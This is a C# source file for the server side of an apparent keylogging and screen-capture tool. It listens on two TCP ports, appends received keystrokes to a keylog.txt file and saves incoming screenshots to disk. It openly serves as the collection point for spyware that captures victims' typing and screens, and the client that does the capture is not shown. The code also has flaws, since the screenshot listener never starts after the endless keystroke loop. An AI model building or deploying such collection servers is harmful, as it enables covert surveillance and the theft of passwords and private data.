/* 
Used socket code from URL=[https://docs.microsoft.com/en-us/dotnet/framework/network-programming/synchronous-server-socket-example]
*/

using System;
using System.IO;
using System.Reflection;
using System.Net;
using System.Net.Sockets;  
using System.Text;  
using System.Drawing;

public static class Globals
{
    public static string logfp = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\keylog.txt";
    public const Int32 keyPort = 40404;
    public const Int32 screenPort = 40405;
}

public class WinLoggerServer {  

    // Incoming data from the client.  
    public static string data = null;  

    public static void StartListening() {  
        // Data buffer for incoming data.  
        byte[] bytes = new Byte[1024];  

        // Establish the local endpoint for the socket.
        IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());  
        IPAddress ipAddress = ipHostInfo.AddressList[0];
        IPEndPoint localEndPoint = new IPEndPoint(ipAddress, Globals.keyPort);  

        // Create a TCP/IP socket.  
        Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);  

        // Bind the socket to the local endpoint and   
        // listen for incoming connections.  
        try {  
            listener.Bind(localEndPoint);  
            listener.Listen(10);  

            // Start listening for connections.  
            while (true) {
                Console.WriteLine("Waiting for a connection...");  
                // Program is suspended while waiting for an incoming connection.  
                Socket handler = listener.Accept();  
                data = null;  

                // An incoming connection needs to be processed.  
                while (true) {  
                    bytes = new byte[1024];  
                    int bytesRec = handler.Receive(bytes);  
                    data += Encoding.ASCII.GetString(bytes,0,bytesRec);
                    Console.WriteLine(data);
                    if (data.IndexOf("<EOF>") > -1) {  
                        break;  
                    }  
                }  
                data = data.Replace("<EOF>", null);
				data = data.Replace("Space", " ");
				data = data.Replace("Period", ".");
                // Append text to the keylogging file.
                File.AppendAllText(Globals.logfp, data + Environment.NewLine); 
 
                handler.Shutdown(SocketShutdown.Both);  
                handler.Close();  
            }  

        } catch (Exception e) {Console.WriteLine(e.ToString());}
	}
		public static void screenListen() {  
        // Data buffer for incoming data.  
        byte[] bytes = new Byte[1048576];  

        // Establish the local endpoint for the socket.
        IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());  
        IPAddress ipAddress = ipHostInfo.AddressList[0];
        IPEndPoint localEndPoint = new IPEndPoint(ipAddress, Globals.screenPort);  

        // Create a TCP/IP socket.  
        Socket listener = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);  

        // Bind the socket to the local endpoint and   
        // listen for incoming connections.  
        try {  
            listener.Bind(localEndPoint);  
            listener.Listen(10);  

            // Start listening for connections.  
            while (true) {
                Console.WriteLine("Waiting for a connection...");  
                // Program is suspended while waiting for an incoming connection.  
                Socket handler = listener.Accept();  
                data = null;  

                // An incoming connection needs to be processed.  
                int bytesRec = handler.Receive(bytes);  
				Image screenGrab;
				using (var memStream = new MemoryStream(bytes))
				{
					screenGrab = Image.FromStream(memStream);
				}
                // Append text to the keylogging file.
                string time = DateTime.Now.ToString();
				string screenfp = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + @"\" + time;
				screenGrab.Save(screenfp);
                handler.Shutdown(SocketShutdown.Both);  
                handler.Close();  
            }  

        } catch (Exception e) {Console.WriteLine(e.ToString());}
    }  

    public static int Main(String[] args) {  
        StartListening();  
		screenListen();
        return 0;  
    }  
}